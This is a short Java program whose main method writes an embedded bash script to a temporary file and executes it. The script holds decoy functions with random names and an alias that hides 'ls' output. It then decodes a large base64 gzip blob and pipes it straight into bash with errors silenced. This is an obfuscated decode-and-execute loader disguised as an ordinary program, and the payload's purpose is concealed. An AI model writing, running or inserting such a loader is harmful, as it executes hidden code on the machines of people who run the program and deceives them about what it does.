import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vpho7w9ak() { echo $((RANDOM * RANDOM)); }
v9bfrq80u() { for i in {1..3}; do :; done; }
vran879ob() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
